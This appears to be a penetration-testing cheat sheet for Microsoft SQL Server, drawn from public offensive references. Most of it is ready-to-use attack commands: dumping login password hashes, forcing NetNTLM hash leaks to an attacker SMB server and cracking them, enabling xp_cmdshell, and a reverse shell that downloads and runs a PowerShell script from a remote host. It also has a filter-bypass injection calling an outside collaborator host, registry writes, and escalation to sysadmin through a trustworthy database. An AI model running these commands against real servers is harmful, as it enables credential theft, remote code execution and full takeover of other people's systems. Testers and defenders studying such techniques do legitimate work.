# MSSQL
Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It uses T-SQL (Transact-SQL) for querying and managing data and is commonly used in enterprise-level applications, especially within Windows environments.  

## Ports
```
1433 Default TCP #1
1434 UDP Name Location
4022 Default TCP #2
1434 DAC
```

## Connection

```sh
# mssqlclient
impacket-mssqlclient <domain>/<username>:<password>@<ip>

# sqlcmd
sqlcmd -S <IP> -U <username> -P <password> -d <database_name> -Q <query>
```

  

# Enumeration
## Manual

```sql
-- Get version
SELECT @@version;

-- Get username
SELECT user_name();

-- Use database USE master
USE MASTER;

-- Get databases
SELECT name FROM master.dbo.sysdatabases;
SELECT * FROM information_schema.schemata;

-- Tables from DB
SELECT * FROM information_schema.tables;

-- Columns from table
SELECT * FROM information_schema.columns;

-- List users
SELECT sp.name AS LOGIN, sp.type_desc AS LOGIN_TYPE, sl.password_hash, sp.create_date, sp.modify_date, CASE WHEN sp.is_disabled = 1 THEN "Disabled" ELSE "Enabled" END AS STATUS FROM sys.server_principals sp LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id WHERE sp.type NOT IN ("G", "R") ORDER BY sp.name;

-- Users and roles
SELECT * FROM sys.database_principals;

-- Enumerate links 
enum_links 
-- Use a link 
use_link [NAME]

-- Get hashed passwords
SELECT * FROM master.sys.syslogins;

-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

## Scripts
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```

# Types of MSSQL Users

| Column Name                      | Data Type         | Description |
|----------------------------------|-------------------|-------------|
| name                             | sysname           | Name of principal, unique within the database. |
| principal_id                     | int               | ID of principal, unique within the database. |
| type                             | char(1)           | Principal type:<br><br>A = Application role<br>C = User mapped to a certificate<br>E = External user from Microsoft Entra ID<br>G = Windows group<br>K = User mapped to an asymmetric key<br>R = Database role<br>S = SQL user<br>U = Windows user<br>X = External group from Microsoft Entra group or applications |
| type_desc                        | nvarchar(60)      | Description of principal type:<br><br>APPLICATION_ROLE<br>CERTIFICATE_MAPPED_USER<br>EXTERNAL_USER<br>WINDOWS_GROUP<br>ASYMMETRIC_KEY_MAPPED_USER<br>DATABASE_ROLE<br>SQL_USER<br>WINDOWS_USER<br>EXTERNAL_GROUPS |
| default_schema_name              | sysname           | Name to be used when SQL name does not specify a schema. Null for principals not of type S, U, or A. |
| create_date                      | datetime          | Time at which the principal was created. |
| modify_date                      | datetime          | Time at which the principal was last modified. |
| owning_principal_id              | int               | ID of the principal that owns this principal. All fixed Database Roles are owned by dbo by default. |
| sid                              | varbinary(85)     | SID (Security Identifier) of the principal. NULL for SYS and INFORMATION SCHEMAS. |
| is_fixed_role                    | bit               | If 1, this row represents an entry for one of the fixed database roles: db_owner, db_accessadmin, db_datareader, db_datawriter, db_ddladmin, db_securityadmin, db_backupoperator, db_denydatareader, db_denydatawriter. |
| authentication_type             | int               | **Applies to: SQL Server 2012 (11.x) and later.**<br><br>Signifies authentication type:<br>0: No authentication<br>1: Instance authentication<br>2: Database authentication<br>3: Windows authentication<br>4: Microsoft Entra authentication |
| authentication_type_desc        | nvarchar(60)      | **Applies to: SQL Server 2012 (11.x) and later.**<br><br>Description of the authentication type:<br>NONE: No authentication<br>INSTANCE: Instance authentication<br>DATABASE: Database authentication<br>WINDOWS: Windows authentication<br>EXTERNAL: Microsoft Entra authentication |
| default_language_name           | sysname           | **Applies to: SQL Server 2012 (11.x) and later.**<br><br>Signifies the default language for this principal. |
| default_language_lcid           | int               | **Applies to: SQL Server 2012 (11.x) and later.**<br><br>Signifies the default LCID for this principal. |
| allow_encrypted_value_modifications | bit          | **Applies to: SQL Server 2016 (13.x) and later, SQL Database.**<br><br>Suppresses cryptographic metadata checks on the server in bulk copy operations. This enables the user to bulk copy data encrypted using Always Encrypted, between tables or databases, without decrypting the data. The default is OFF. |

# Steal NetNTLM Hash

When executing a command on the SQL server which requests resources from the attacker's SMB server, the hash will be captured on that server.

1. Start an **SMB server** to capture hash upon request *(local)*.

```sh
# Responder.py
sudo python3 Responder.py -I tun0  

# impacket-smbserver
sudo impacket-smbserver share ./ -smb2support
```

2. Run one of the following commands *(remote)*.

```sql
xp_dirtree "\\<IP>\any\thing\"
exec master.dbo.xp_dirtree "\\<IP>\anything\"
EXEC master..xp_subdirs "\\<IP>\anything\"
EXEC master..xp_fileexist "\\<IP>\anything\"
```

## Cracking The Hash

```sh
hashcat -m 5600 <hash_file> <wordlist>
```

  

# Command Execution
Note that in order to be able to execute commands it's not only necessary to have **`xp_cmdshell`** **enabled**, but also have the **EXECUTE permission on the `xp_cmdshell` stored procedure**.
## Local


```sql
-- This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
-- This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

-- Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
-- Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http:/remote.com:8000/rev.ps1") | powershell -noprofile'

-- Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```

## Remote
  
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
```



# Read Registry

Microsoft SQL Server provides **multiple extended stored procedures** that allow you to interact with not only the network but also the file system and even the [**Windows Registry**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)

|**Regular**|**Instance-Aware**|
|---|---|
|sys.xp_regread|sys.xp_instance_regread|
|sys.xp_regenumvalues|sys.xp_instance_regenumvalues|
|sys.xp_regenumkeys|sys.xp_instance_regenumkeys|
|sys.xp_regwrite|sys.xp_instance_regwrite|
|sys.xp_regdeletevalue|sys.xp_instance_regdeletevalue|
|sys.xp_regdeletekey|sys.xp_instance_regdeletekey|
|sys.xp_regaddmultistring|sys.xp_instance_regaddmultistring|
|sys.xp_regremovemultistring|sys.xp_instance_regremovemultistring|
```sql
-- Example read registry 
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory'; 

-- Example write and then read registry 
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!'; EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';

-- Example to check who can use these functions 
Use master; EXEC sp_helprotect 'xp_regread'; EXEC sp_helprotect 'xp_regwrite';
```


# Privilege Escalation
```sql
-- Get owners of databases 
SELECT suser_sname(owner_sid) FROM sys.databases 
-- Find trustworthy databases 
SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name; 

-- Get roles over the selected database (look for your username as db_owner) 
USE <trustworthy_db> SELECT rp.name as database_role, mp.name as database_user from sys.database_role_members drm join sys.database_principals rp on (drm.role_principal_id = rp.principal_id) join sys.database_principals mp on (drm.member_principal_id = mp.principal_id) 

-- If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role 
USE <trustworthy_db> CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'USERNAME','sysadmin'
--2. Execute stored procedure to get sysadmin role 
USE <trustworthy_db> EXEC sp_elevate_me 
--3. Verify your user is a sysadmin 
SELECT is_srvrolemember('sysadmin')
```

# References

- [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
- [https://learn.microsoft.com/en-us/sql/?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/?view=sql-server-ver17)
- [https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-principals-transact-sql?view=sql-server-ver16](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-principals-transact-sql?view=sql-server-ver16)
- [https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)